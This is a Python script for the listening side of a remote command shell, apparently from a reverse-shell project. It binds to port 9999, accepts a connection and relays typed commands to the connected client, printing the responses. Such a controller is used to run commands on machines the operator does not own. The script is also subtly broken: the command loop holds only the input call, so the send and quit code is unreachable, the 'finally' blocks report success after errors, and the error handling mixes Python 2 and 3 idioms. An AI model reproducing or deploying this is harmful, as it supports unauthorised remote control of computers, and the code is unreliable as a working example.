#!/usr/bin/env python
import socket, sys

def create_socket():

	try:
		global host
		global port
		global conSocket

		host = ''
		port = 9999
		conSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	except socket.error as error_message:
		print("Socket creation failed! Error Code: {} Error Message: {}".format(error_message[0], str(error_message[1])))
	finally:
		print("Socket creation succeeded!")

def bind_socket():

	try:
		global host
		global port
		global conSocket

		conSocket.bind((host, port))
		conSocket.listen(5)

		print("Binding host to port {}".format(str(port)))
	except socket.error as error_message:
		print("Port Bind Error!\nError Code: {} Error Message: {}\nRetrying...".format(error_message[0], str(error_message[1])))

		bind_socket()
	finally:
		print("Socket Bind successful!!!")

def accept_socket():

	#creates a connection object with the given IP/port in list format address[0](string)
	#address[1](int)
	conn, address = conSocket.accept()
	print("Connection established! | IP: {} Port: {}".format(address[0], str(address[1])))

	send_commands(conn)
	conn.close() #closes the connection

def send_commands(conn): #send commands to the client (takes connection object as parameter)

	while True:
		cmd = input()
	if cmd == 'quit':
		conn.close() #close the connection
		conSocket.close() #close the socket
		sys.exit(0) #exit the program

	if len(str.encode(cmd)) > 0:
		conn.send(str.encode(cmd))
		client_response = str(conn.recv(1024), "utf-8")
		print(client_response, end="")

def main():
	
	#creates the socket
	create_socket()
	#bind the socket and listen on specified port
	bind_socket()
	#accept the connection and send commands to the client
	accept_socket()

if __name__=='__main__':
	main()
